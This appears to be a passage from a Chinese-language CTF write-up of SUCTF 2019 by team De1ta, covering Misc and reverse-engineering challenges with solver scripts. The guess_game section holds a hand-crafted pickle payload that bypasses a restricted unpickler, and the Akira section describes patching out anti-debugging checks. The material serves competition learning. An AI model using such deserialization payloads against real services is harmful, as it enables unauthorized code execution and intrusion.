    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team: De1ta</p></blockquote><p>前排广告位：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系<code>ZGUxdGFAcHJvdG9ubWFpbC5jb20=</code></p><!-- toc --><ul><li><a href="#misc">Misc</a><ul><li><a href="#签到">签到</a></li><li><a href="#guess_game">guess_game</a></li><li><a href="#game">game</a></li><li><a href="#protocol">protocol</a></li><li><a href="#homerouter">homerouter</a><ul><li><a href="#使用pandorabox">使用PandoraBox</a></li><li><a href="#使用openwrt软路由">使用OpenWRT软路由</a></li></ul></li></ul></li><li><a href="#re">RE</a><ul><li><a href="#signup">signup</a></li><li><a href="#hardcpp">hardcpp</a></li><li><a href="#akira-homework">Akira Homework</a></li><li><a href="#babyunic">babyunic</a></li><li><a href="#rev">Rev</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#playfmt">playfmt</a></li><li><a href="#babystack">babystack</a></li><li><a href="#sudrv">sudrv</a></li><li><a href="#二手旧电脑">二手旧电脑</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#prime">Prime</a></li><li><a href="#dsa">DSA</a></li><li><a href="#mt">mt</a></li><li><a href="#rsa">RSA</a></li></ul></li><li><a href="#web">web</a><ul><li><a href="#checkin">CheckIn</a></li><li><a href="#easyphp">EasyPHP</a></li><li><a href="#upload-labs-2">Upload labs 2</a></li><li><a href="#easy_sql">easy_sql</a></li><li><a href="#pythonnginx">pythonnginx</a></li><li><a href="#cocktails-remix">Cocktail's Remix</a></li></ul></li></ul><!-- tocstop --><h1><span id="misc">Misc</span></h1><h2><span id="签到">签到</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">a=open(<span class="string">"1.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">c=open(<span class="string">"1.png"</span>,<span class="string">"wb"</span>)</span><br><span class="line">c.write(b64decode(a))</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100803-2d7608bc-c226-1.png" alt><figcaption>image.png</figcaption></figure><h2><span id="guess_game">guess_game</span></h2><p>一个猜数字游戏，题目提供了客户端和服务端。这个游戏有10轮，每轮猜0-10共11个数字，10轮全部猜中才出flag，直接碰撞不可能。</p><p>这题主要考察对 <code>pickle</code> 序列化的了解，读懂 <code>pickle</code> 的源代码，手工构造出相应 <code>payload</code> 即可。</p><p><img src="https://i.loli.net/2019/08/19/bL8AW9fvODPMBCa.png"></p><p><code>RestrictedUnpickler.py</code> 里重写了 <code>find_class</code>，对反序列化的对象位置进行了限制，只允许 <code>guess_game</code> 下的模块，而且不允许含 <code>__</code> 的内置对象。</p><p>那么可以先反序列化一个 <code>guess_game里的game对象</code>，然后再反序列化一个 <code>guess_game.Ticket里的Ticket类</code>，参数 <code>number</code> 随便赋一个值（比如6），然后将 <code>Ticket</code> 赋值给 <code>game的curr_ticket</code> 覆盖服务端随机生成的 <code>Ticket</code>，最后我们再反序列化一次最开始反序列化的 <code>Ticket</code>，参数 <code>number</code> 赋相同值。</p><p>将以上反序列化过程，对照 <code>pickle</code> 源代码构造好一条语句，直接循环10次打过去，就能拿到flag。</p><p>构造好的 <code>payload</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticket = b&quot;\x80\x04cguess_game\ngame\nN(S&apos;curr_ticket&apos;\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sbd\x86bcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/19/cg5eYM7XbQUuzwK.png"></p><p>Flag: <code>flag{cabe5968-8143-4c45-91b7-557edab2ab4d}</code></p><h2><span id="game">game</span></h2><p>index.html里有一句话：<code>can u find my secret</code>? 在两个js文件里搜，找到一个图片文件名：<code>iZwz9i9xnerwj6o7h40eauZ.png</code>，下下来，用Stegsolver看一下LSB，发现有一串字符：<code>U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</code>，根据U2FsdGVkX1猜测是密文，试了一下，3DES，密钥是index.html中的字符串<code>ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===</code>的b32decode，解开可得flag &gt;flag: <code>suctf{U_F0und_1t}</code></p><h2><span id="protocol">protocol</span></h2><p>简单看一下流量包，发现有很多png，foremost提取出来，图片有两种，一种是一个字符的镜面图片，另一种是空白图片，并且每隔15张字符图片后有10张空白图片。重新审计流量包，发现传输每张图片的流量的数据部分第3个字节有一定的变化规律，遂将该字节相同的空白图片与字符图片一一对应，即得flag。 &gt;flag: <code>suctf{My_usb_pr0toco1_s0_w3ak}</code></p><h2><span id="homerouter">homerouter</span></h2><p>先试着用binwalk提取下发的路由器固件，能看到文件：</p><figure><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_3.png" alt><figcaption>HOMEROUTER_3.png</figcaption></figure><p>这个时候能看到有个那么不常见的东西：</p><figure><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_4.png" alt><figcaption>HOMEROUTER_4.png</figcaption></figure><p>能看到配置文件里有个不寻常的东西：</p><figure><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_5.png" alt><figcaption>HOMEROUTER_5.png</figcaption></figure><blockquote><p>EasyCwmp is a GPLv2 open source implementation of the TR069 cwmp standard.</p></blockquote><p>这个时候就大概能猜想要去利用easycwmp来连接一下服务器看看会有什么。可以选择用qemu来跑固件，比较省事。还有个比较不那么靠谱的方法就是用Burp一类的工具模拟协议发包和服务器交互了。</p><p>有关更多信息，可以查看这里或者Google。</p><p><a href="https://www.twblogs.net/a/5b7f63712b717767c6af5969" target="_blank" rel="noopener">TR069之CPE與ACS的Digest驗證</a></p><p><a href="https://blog.csdn.net/Lock_Love_/article/details/48713243" target="_blank" rel="noopener">TR-069 协议完整的通信过程</a></p><p>由于这边不知道为啥qemu有点问题跑不起来，于是乎拿了一个路由器和一个软路由试了一下，下面都记录了。比赛的时候是用的一台平时折腾用的Phicomm K2，之前刷了PandoraBox，于是直接SSH上去。</p><h3><span id="使用pandorabox">使用PandoraBox</span></h3><p>由于PandoraBox有预编译的包，所以可以直接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br><span class="line">opkg install easycwmp</span><br></pre></td></tr></table></figure><p>然后编辑<code>/etc/config/easycwmp</code>里的acs相关的配置。串号随意改一个就好了。</p><p>这个时候如果尝试直接跑<code>easycwmp -f -b</code>的话可能会没有反应就退出了，好像是因为这里的easycwmp自己已经启动了。只好<code>ps</code>看一下进程，然后把它<code>kill</code>掉。</p><p>这个时候应该能正常用了，不过我这边没有输出，像卡住了一样，搜了一下发现应该去看syslog。于是先开着：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logread -f</span><br></pre></td></tr></table></figure><p>然后改了个串号再开<code>easycwmp -f -b</code>。如果发现日志里出现<code>Error reading ca cert file</code>的话，可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg install ca-bundle</span><br></pre></td></tr></table></figure><p>然后重试上面的步骤。如果<code>/usr/share/easycwmp/functions</code>下的文件里有<code>system_set_password root</code>的话（没有的话就去把固件里的<code>/usr/share/easycwmp/functions/system</code>复制一份过来），应该能在日志里读到：（就是下发配置修改root密码）</p><figure><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_6.png" alt><figcaption>HOMEROUTER_6.png</figcaption></figure><p>最后...接下来你可能会因为接下来登录不了SSH和LuCI而怀疑人生，不要慌，因为它帮你把密码设置成了flag...</p><h3><span id="使用openwrt软路由">使用OpenWRT软路由</span></h3><p>这个只要搞个虚拟机就可以跑，比较简单。没有的话可以先下载一下镜像：<a href="https://downloads.openwrt.org/snapshots/targets/x86/64/" target="_blank" rel="noopener">Index of /snapshots/targets/x86/64/</a>。（其实也可以玩玩Koolshare的LEDE）</p><p>具体安装方法可以看这里：<a href="https://openwrt.org/docs/guide-user/virtualization/virtualbox-vm" target="_blank" rel="noopener">Run OpenWrt as a VirtualBox virtual machine</a>。</p><p>主要就是解压，然后转盘：</p><figure class="highlight bash"><figcaption><span>tab</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VBoxManage convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;C:\Program Files\Oracle\VirtualBox\VBoxManage.exe&apos; convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi</span><br></pre></td></tr></table></figure><p>然后VirtualBox新建虚拟机，使用已存在的虚拟硬盘文件即可。启动前需要保证网卡1是仅主机（Host-only）适配器，网卡2是NAT，不然可能上不了网。（Koolshare的好像不大一样，自己看文档吧）</p><p>要是启动后网络还是有问题就：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uci show network</span><br></pre></td></tr></table></figure><p>看一下。可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uci <span class="built_in">set</span> network.lan.ipaddr=<span class="string">'192.168.56.2'</span></span><br><span class="line">uci commit</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>把不对的改掉。</p><p>然后就可以来装easycwmp了。现在没有预编译的包了，只好自己编译。</p><p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/x86_64/easycwmp_1.8.1_x86_64.ipk" target="_blank" rel="noopener">x86_64/easycwmp_1.8.1</a></p><p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/x86_64/libmicroxml_2015_03_18_caa8d3e68.ipk" target="_blank" rel="noopener">x86_64/libmicroxml</a></p><p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/i386/easycwmp_1.8.1_i386_pentium4.ipk" target="_blank" rel="noopener">i386/easycwmp_1.8.1</a></p><p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/i386/libmicroxml_2015_03_18_caa8d3e68.ipk" target="_blank" rel="noopener">i386/libmicroxml</a></p><p>这里贴一下自己编译的，可以直接下载对应架构的，然后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg install xxx.ipk</span><br></pre></td></tr></table></figure><p>非要自己编译的话就看着<a href="https://github.com/pivasoftware/easycwmp" target="_blank" rel="noopener">这里（pivasoftware/easycwmp）</a>的README编译吧。需要先<code>git clone https://github.com/openwrt/openwrt</code>，然后把<a href="http://easycwmp.org/download/easycwmp-openwrt-1.8.1.tar.gz" target="_blank" rel="noopener">easycwmp-openwrt</a>和<a href="http://easycwmp.org/download/libmicroxml.tar.gz" target="_blank" rel="noopener">microxml</a>的压缩包解压到<code>openwrt/package</code>下，这个时候在<code>openwrt</code>目录下执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>应该就能在Utilities里找到easycwmp了。根据自己的需要进行<code>make</code>即可。</p><p>安装完成后的操作就和在PandoraBox下差不多了，就是改配置，然后读日志，再启动客户端就好了。</p><figure><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_7.png" alt><figcaption>HOMEROUTER_7.png</figcaption></figure><h1><span id="re">RE</span></h1><h2><span id="signup">signup</span></h2><p>gmp库计算RSA</p><p>直接在factordb分解N</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(hex(m)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>))</span><br></pre></td></tr></table></figure><h2><span id="hardcpp">hardcpp</span></h2><p>用ollvm混淆过的c++代码。</p><p>开头给了一个类似哈希的东西，先不管。</p><p>ollvm中应该开了运算混淆，流程平坦化和一些虚假分支，调试一下发现主要流程就在那一堆lamda那里。</p><p>输入一共21位长度，从下标为1开始加密，和之前一位进行一些四则运算，然后和enc比较，enc一共20位。</p><p>这些四则运算都是可逆的，所以知道一位就能求出下一位，只需要爆破下标为0的字符，即可求出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">enc = [  <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>,</span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    a = [j]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        a.append(((enc[i] ^ ((a[i]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>))-(a[i]%<span class="number">7</span>))&amp;<span class="number">0xff</span>)</span><br><span class="line">    s = <span class="string">""</span>.join(map(chr,a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> s:</span><br><span class="line">        print(s)</span><br></pre></td></tr></table></figure><p>查一下md5发现是井号，也就是第一个字符。</p><h2><span id="akira-homework">Akira Homework</span></h2><p>程序有多处反调试，以及多处check，通过这些check会还原一个dll，后面多线程会进入这个dll最终到一段aes的逻辑得到flag。</p><p>程序中的字符串都被某一个字符异或加密了，所以搜不到字符串，但是可以对key数组查找引用找到所有加密的字符串。</p><p>做法以调试为主，先把地址随机化关掉，然后在所有Isdebuggerpresent和exit处下断点查看，基本遇到的反调试直接nop/jmp掉</p><p>开始的tls回调函数会解密四个字符串NtQueryInformationProcess，ZwQueryInformationThread，NtQueueApcThread和ntdll.dll。查找这些字符串的引用可以在后面看到用GetProcAdreee获取这些函数地址。但是使用ida调试的时候，tls回调函数被多次调用了，可能是后面多线程的关系，导致这些字符串被重复加密，到最后就没被还原去使用了，所以在这里打断点，第一次停下的时候执行解密，之后每次停下都直接set ip到最后ret</p><p>main函数逻辑较为简单：开头起了多线程，先看主线程的逻辑：</p><p>先输入一串passwd，经过一串简单的加密，解密出来是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Akira_aut0_ch3ss_!</span><br></pre></td></tr></table></figure><p>之后第二个check会获取当前目录，在后面加一个:signature后打开，比如/WinRev.exe:signature，从中获取内容并md5校验。md5解出来是<code>Overwatch</code>问了下队里师傅，冒号说是文件流，可以通过一下指令写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type 1.txt &gt;&gt; WinRev.exe:signature</span><br></pre></td></tr></table></figure><p>1.txt中放要写入的内容。把"Overwatch"字符串写入后就能通过check。</p><p>注意到两个check通过后都会调用<code>sub_140006C10</code>函数，里面调用了某个函数，下断跟进后发现是这两个函数</p><p><code>sub_140008910</code>和<code>sub_1400089E0</code>他们对全局变量<code>unk_1400111A0</code>进行了解密，然后SetEvent一个Handles变量，这个变量一共又三个。通过查找他的交叉引用以及<code>sub_140006C10</code>函数的引用，发现在开头起的多线程里面<code>sub_140008B20</code>又被调用了。简</p><p>单分析下这个函数，发现这里md5了什么东西并和一些md5值校验，相等则直接exit。这里可以猜到md5的可能是进程名，如果有ida.exe等进程则退出，通过下断点调试也能发现，在退出时可以看到md5的内容是ida64.exe。通过进程名校验后会调用<code>sub_140006C10</code>解密。判定了一个全局变量，所以只会解密一次。</p><p>全部通过这三个校验并完成，会看到解密完的结果有pe头。dump出来是个dll</p><p>之后main函数就没啥用了，sleep挂起。为了方便调试，可以修改sleep的时间，调大一些。</p><p>接下来主要是另一个线程中干的事了。分析beginthreadex的起始函数，注意到里面有个<code>sub_140009850</code>中信息很多。发现了DllInput以及校验了MZ字符。开头他在等待三个Handles设定完毕。但进入这个函数的条件<code>byte_140016198</code>一直没找到在哪设置。分析<code>sub_140008D20</code>函数，他会调用参数一函数指针，查找这个全局变量的引用，看到它是在<code>sub_140009C20</code>中被设置，同样的还有<code>qword_140016178</code>和<code>qword_140016180</code>，他们最终被<code>sub_140008850</code>设置成一开始tls回调函数解密的NtQueryInformationProcess，ZwQueryInformationThread和NtQueueApcThread，当他们都被成功设置后，就能成功进入<code>sub_140009850</code>的逻辑了。</p><p>如果wait到一个258的信号，会提示time out并推出，所以之前sleep要改长一点。</p><p>单步调试发现到<code>sub_140007D80</code>里面会获取输入，逐步f8跟进最终来到<code>sub_180002880</code>是最后的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_180002880</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-B8h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-98h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-88h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+38h] [rbp-80h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+40h] [rbp-78h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+48h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+50h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+68h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+80h] [rbp-38h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+90h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v8, <span class="number">0</span>, <span class="number">0x11</span>ui64);</span><br><span class="line">  ucrtbase_puts(<span class="string">"Now check the sign:"</span>);</span><br><span class="line">  sub_1800027A0(<span class="string">"%32s"</span>, &amp;v8);</span><br><span class="line">  v5 = kernel32_OpenEventW(<span class="number">2031619</span>i64, <span class="number">1</span>i64, <span class="string">L"DLLInput"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    kernel32_WaitForSingleObject(v5, <span class="number">0xFFFFFFFF</span>i64);</span><br><span class="line">    kernel32_CloseHandle(v5);</span><br><span class="line">    v4 = kernel32_OpenFileMappingW(<span class="number">983071</span>i64, <span class="number">0</span>i64, <span class="string">L"ShareMemory"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">0x8000</span>i64;</span><br><span class="line">      kernel32_MapViewOfFile();</span><br><span class="line">      v7 = v0;</span><br><span class="line">      <span class="keyword">if</span> ( v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        kernel32_CloseHandle(v4);</span><br><span class="line">        v6 = ucrtbase_malloc(<span class="number">0x8000</span>i64);</span><br><span class="line">        vcruntime140_memset(v6, <span class="number">0</span>i64, <span class="number">0x8000</span>i64);</span><br><span class="line">        vcruntime140_memcpy(v6, v7, <span class="number">0x8000</span>i64);</span><br><span class="line">        <span class="built_in">strcpy</span>(&amp;v10, <span class="string">"Ak1i3aS3cre7K3y"</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v9, <span class="number">0</span>, <span class="number">0x11</span>ui64);</span><br><span class="line">        sub_180002800(&amp;v10, &amp;v9, v6);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ucrtbase_strcmp(&amp;v9, &amp;v8) )</span><br><span class="line">          sub_1800026F0(<span class="string">"wow... game start!\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          sub_1800026F0(<span class="string">"Get finally answer!\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        kernel32_CloseHandle(v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_180002AB0((<span class="keyword">unsigned</span> __int64)&amp;v2 ^ v11);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>sub_180002800</code>很容易看出是aes，密文是之前另一个线程里面看起来很像密文的东西，key就在这里。由于这里获取输入后直接跟解密后的明文比较，所以不需要自己解密，在strcmp下断点就能看到flag了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Ak1rAWin!&#125;</span><br></pre></td></tr></table></figure><h2><span id="babyunic">babyunic</span></h2><p>使用unicorn引擎，翻一下unicorn源码可以得知几个函数及参数的意思</p><p>https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/unicorn.h</p><p>https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/mips.h</p><p>可以得知架构是mips，大端序</p><p>输入的flag与结果分别被写到两个地址，分别作为指针通过a0和a1传入，然后设置了fp和sp的值。代码写到另一个地址，然后开始执行。最后从结果处读数据与常量对比。</p><p>ida自带有mips大端序处理器模块，使用retdec插件可以反编译，但是效果不是很好。</p><p>不过代码逻辑特别简单，很容易能看懂。</p><p>先是循环左移三位，然后异或下标，最后互相加减计算出42个结果。</p><p>因此只需解42元方程组。</p><p>编写脚本提取出方程组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">bg = 0x00000378</span><br><span class="line">end = 0x00007058</span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line">def next_instr(addr):</span><br><span class="line">    return addr+ItemSize(addr)</span><br><span class="line">counter = 0</span><br><span class="line">counter_c = 1</span><br><span class="line"></span><br><span class="line">while(addr&lt;end):</span><br><span class="line">    counter = 0</span><br><span class="line">    print &quot;flag[0]&quot;,</span><br><span class="line">    while(True):</span><br><span class="line">        next = next_instr(addr)</span><br><span class="line">        mnem = GetMnem(addr)</span><br><span class="line"></span><br><span class="line">        if &apos;addiu&apos; in mnem:</span><br><span class="line">            counter+=1</span><br><span class="line">        elif &apos;addu&apos; in mnem:</span><br><span class="line">            print &quot;+ flag[%d]&quot;%counter,</span><br><span class="line">        elif &quot;subu&quot; in mnem:</span><br><span class="line">            print &quot;- flag[%d]&quot;%counter,</span><br><span class="line">        if &quot;sw&quot; in GetDisasm(addr):</span><br><span class="line">            print(&quot;== cipher[%d]&quot;%counter_c)</span><br><span class="line">            addr = next</span><br><span class="line">            addr = next_instr(addr)</span><br><span class="line">            addr = next_instr(addr)</span><br><span class="line">            break</span><br><span class="line">        addr = next</span><br><span class="line">    counter_c+=1</span><br></pre></td></tr></table></figure><p>然后用文本操作提取出矩阵，解出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line">A = mat([[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span 